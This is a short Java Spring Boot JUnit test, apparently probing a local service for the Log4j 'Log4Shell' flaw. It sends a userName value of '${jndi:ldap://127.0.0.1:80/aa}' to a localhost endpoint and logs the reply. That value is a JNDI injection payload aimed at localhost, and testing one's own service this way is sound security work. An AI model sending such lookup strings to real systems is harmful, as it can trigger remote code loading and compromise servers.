package com.zyh.member.test;

import com.alibaba.nacos.api.naming.NamingService;
import lombok.extern.slf4j.Slf4j;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.web.client.RestTemplate;

import javax.annotation.Resource;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

@RunWith(SpringRunner.class)
@SpringBootTest
@Slf4j
public class Lgf4jBugTest {
    @Autowired
    private RestTemplate restTemplate;

    @Resource
    NamingService namingService;

    @Test
    public void getlost() {
        Map<String, String> pa = new HashMap<>();
        pa.put("userName", "${jndi:ldap://127.0.0.1:80/aa}");
        List<String> result = restTemplate.getForObject("http://localhost:8080/user", List.class, pa);
        log.info("----result---" + result);
    }

}
